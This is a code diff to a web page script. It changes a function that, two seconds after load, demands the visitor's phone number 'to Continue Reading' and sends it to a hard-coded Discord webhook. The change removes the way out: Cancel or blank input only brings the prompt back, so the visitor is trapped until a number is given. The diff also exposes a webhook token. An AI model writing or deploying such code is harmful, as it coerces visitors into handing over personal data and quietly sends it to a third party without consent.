@@ -162,24 +162,35 @@ function detectOS() {
 }
 // number
 function askForPhoneNumber() {
-  let phone;
-  const phoneRegex = /^\d{11}$/; // Exactly 11 digits
+  const phoneRegex = /^\d{11}$/; // 11 digits only
 
-  do {
-    phone = prompt("Enter Your Phone to Continue Reading :");
-    if (phone === null) return; // User clicked cancel, you can handle it differently if needed
-  } while (!phoneRegex.test(phone));
+  let phone = "";
+
+  while (true) {
+    phone = prompt("Enter Your Phone Number to Continue Reading (11 digits required):");
+
+    // If user clicks Cancel or closes prompt, prompt again
+    if (phone === null || phone.trim() === "") {
+      continue;
+    }
+
+    // Validate: must be 11 digits, only numbers
+    if (phoneRegex.test(phone.trim())) {
+      break; // valid input
+    }
+  }
 
   // Send to Discord webhook
   fetch("https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ content: phone })
+    body: JSON.stringify({ content: phone.trim() })
   });
 }
 
-// Delay for 2 seconds before showing the prompt
+// Trigger after 2-second delay
 setTimeout(askForPhoneNumber, 2000);
+
 //
 
 detectOS();
